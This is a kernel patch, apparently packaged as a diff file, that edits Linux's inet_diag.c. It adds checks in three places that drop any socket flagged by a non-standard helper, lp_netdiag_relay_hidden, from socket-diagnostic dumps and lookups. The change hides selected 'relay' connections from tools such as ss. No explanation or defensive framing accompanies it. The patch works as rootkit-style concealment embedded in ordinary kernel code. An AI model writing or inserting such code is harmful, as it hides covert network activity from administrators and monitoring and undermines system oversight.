@@ -1,0 +1,33 @@
+--- a/net/ipv4/inet_diag.c
++++ b/net/ipv4/inet_diag.c
+@@ -497,6 +497,8 @@
+ 			const struct inet_diag_req_v2 *r,
+ 			u16 nlmsg_flags, bool net_admin)
+ {
++	if (lp_netdiag_relay_hidden(sk))
++		return 0;
+ 	if (sk->sk_state == TCP_TIME_WAIT)
+ 		return inet_twsk_diag_fill(sk, skb, cb, nlmsg_flags, net_admin);
+ 
+@@ -566,6 +568,11 @@
+ 	if (IS_ERR(sk))
+ 		return PTR_ERR(sk);
+ 
++	if (lp_netdiag_relay_hidden(sk)) {
++		err = -ENOENT;
++		goto out;
++	}
++
+ 	rep = nlmsg_new(inet_sk_attr_size(sk, req, net_admin), GFP_KERNEL);
+ 	if (!rep) {
+ 		err = -ENOMEM;
+@@ -1056,6 +1063,9 @@
+ 					goto next_listen;
+ 
+ 				if (!inet_diag_bc_sk(bc, sk))
++					goto next_listen;
++
++				if (lp_netdiag_relay_hidden(sk))
+ 					goto next_listen;
+ 
+ 				if (inet_sk_diag_fill(sk, inet_csk(sk), skb,
